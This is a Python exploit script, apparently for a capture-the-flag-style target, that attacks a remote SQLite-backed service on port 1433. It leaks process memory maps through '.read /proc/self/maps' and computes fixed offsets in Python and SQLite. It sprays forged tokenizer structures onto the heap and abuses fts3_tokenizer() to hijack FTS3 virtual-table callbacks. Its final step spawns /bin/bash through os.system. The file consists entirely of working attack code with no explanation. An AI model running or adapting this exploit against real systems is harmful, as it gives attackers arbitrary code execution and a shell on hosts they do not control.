#!/usr/bin/env python3

import socket
import sys
import re
from binascii import hexlify

ERROR = -1
PORT = 1433

def clear_input(s):
    s.recv(1024)

def exec_sql(s, sql):
    q = "%s\n" % re.sub('\n', ' ', sql)
    s.send(q.encode('utf-8'))

def recv(s):
    data = ''
    while True:
        if ">" in data:
            return data.rstrip().rstrip('>').rstrip()
        data = data + s.recv(1024).decode('utf-8')

def pwn(host):
    s = socket.socket()
    s.settimeout(3)

    try:
        s.connect((host, PORT))
    except socket.timeout:
        print("E! Connection error: timeout", file=sys.stderr)
        sys.exit(ERROR)
    except ConnectionRefusedError:
        print("E! Connection error: connection refused", file=sys.stderr)
        sys.exit(ERROR)

    print("[+] Connected")
    recv(s)

    sql = ".read /proc/self/maps\n"
    s.send(sql.encode('utf-8'))
    maps = recv(s)

    python_base_addr = int(maps.splitlines()[0][:12], 16)
    heap_base_addr = int(maps.splitlines()[6][:12], 16)

    main_addr = python_base_addr + 0xbcc40
    py_new_interpreter_addr = python_base_addr + 0xb86b7

    sqlite_base_addr = int(maps.splitlines()[7][:12], 16)
    simple_create_addr = sqlite_base_addr + 0x33aa0
    simple_destroy_addr = sqlite_base_addr + 0x2c790
    simple_open_addr = sqlite_base_addr + 0x33a10
    simple_close_addr = sqlite_base_addr + 0x1b960
    simple_next_addr = sqlite_base_addr + 0x37dd0

    py_new_interpreter_struct =  (0).to_bytes(8, byteorder='little')
    py_new_interpreter_struct += simple_create_addr.to_bytes(8, byteorder='little')
    py_new_interpreter_struct += py_new_interpreter_addr.to_bytes(8, byteorder='little')
    py_new_interpreter_struct += simple_open_addr.to_bytes(8, byteorder='little')
    py_new_interpreter_struct += simple_close_addr.to_bytes(8, byteorder='little')
    py_new_interpreter_struct += simple_next_addr.to_bytes(8, byteorder='little')

    main_struct =  (0).to_bytes(8, byteorder='little')
    main_struct += main_addr.to_bytes(8, byteorder='little')
    main_struct += simple_destroy_addr.to_bytes(8, byteorder='little')
    main_struct += simple_open_addr.to_bytes(8, byteorder='little')
    main_struct += simple_close_addr.to_bytes(8, byteorder='little')
    main_struct += simple_next_addr.to_bytes(8, byteorder='little')

    print("Py_NewInterpreter struct:	%s" % py_new_interpreter_struct.hex())
    print("Main struct:			%s" % main_struct.hex())

    sql = "SELECT replace(hex(zeroblob(10000)), '00', x'4141414141414141%s4242424242424242%s4343434343434343');" % (py_new_interpreter_struct.hex(), main_struct.hex())
    exec_sql(s, sql)
    recv(s)

    input('...')

    py_new_interpreter_struct_addr = heap_base_addr + 0x104f1f
    sql = "SELECT hex(fts3_tokenizer('new_interpreter', x'%s'));" % py_new_interpreter_struct_addr.to_bytes(8, byteorder='little').hex()
    exec_sql(s, sql)
    recv(s)

    main_struct_addr = heap_base_addr + 0x104f58
    sql = "SELECT hex(fts3_tokenizer('main', x'%s'));" % main_struct_addr.to_bytes(8, byteorder='little').hex()
    exec_sql(s, sql)
    recv(s)

    sql = """
    CREATE VIRTUAL TABLE new_interpreter USING fts3(tokenize=new_interpreter);
    DROP TABLE new_interpreter;
    CREATE VIRTUAL TABLE main USING fts3(tokenize=main "/usr/bin/python2" "-c" "import os; os.system('/bin/bash')");
    """
    exec_sql(s, sql)
    recv(s)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("USAGE: %s <host>" % sys.argv[0], file=sys.stderr)
        sys.exit(ERROR)

    pwn(sys.argv[1])
